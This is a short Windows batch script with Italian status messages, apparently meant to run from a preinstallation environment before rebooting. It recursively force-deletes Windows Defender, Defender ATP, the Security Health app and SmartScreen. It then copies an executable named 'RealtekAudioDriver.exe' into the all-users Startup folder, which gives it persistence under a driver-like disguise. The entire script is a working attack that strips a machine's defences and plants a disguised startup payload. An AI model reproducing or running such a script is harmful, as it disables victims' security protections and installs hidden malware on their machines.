del /f /s /q "C:\Program Files\Windows Defender"
del /f /s /q "C:\Program Files\Windows Defender Advanced Threat Protection"
del /f /s /q "C:\ProgramData\Microsoft\Windows Defender"
del /f /s /q "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection"
del /f /s /q "C:\Program Files\WindowsApps\*Microsoft.SecHealthUI*"
del /f /s /q "C:\Windows\System32\smartscreen.exe"
copy RealtekAudioDriver.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
echo Esecuzione script completata, controllare il terminale per eventuali errori.
echo.
echo.
echo Riavvio in corso...
wpeutil reboot